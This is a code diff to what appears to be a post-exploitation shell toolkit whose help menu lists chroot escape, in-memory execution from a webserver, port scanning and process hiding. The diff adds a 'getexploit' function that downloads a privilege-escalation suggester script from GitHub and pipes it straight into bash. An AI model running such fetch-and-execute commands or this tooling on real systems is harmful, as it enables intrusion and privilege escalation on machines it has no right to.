@@ -528,6 +528,12 @@ hangup() {
   done
 }
 
+getexploit () {
+#need a better way to do this, honestly
+#i'd like to pass the -g argument to the script
+orc_loadURL 'https://raw.githubusercontent.com/bcoles/linux-exploit-suggester/master/linux-exploit-suggester.sh' | bash
+}
+
 getenum() {
 echo "Doing some basic listing of the usual suspects..."
 echo -ne "Kernel: "
@@ -558,6 +564,7 @@ echo "[*] getspec - grab some hardware information."
 echo "[*] getuservices - list all running services with non-user accounts in passwd"
 echo "[*] getescape - attempt to escape chroot via bad privs on the /proc/ filesystem."
 echo "[*] getdbus - list all dbus services."
+echo "[*] getexploit - download and run linux-exploit-suggester"
 echo "[*] memexec - execute a binary in-memory from a webserver - memexec [full URI] (x64 only)"
 echo "[*] portscan - run a portscan against common ports - portscan [host]"
 echo "[*] prochide - run a program with $0 changed to the longest entry in ps - prochide [program + args]"
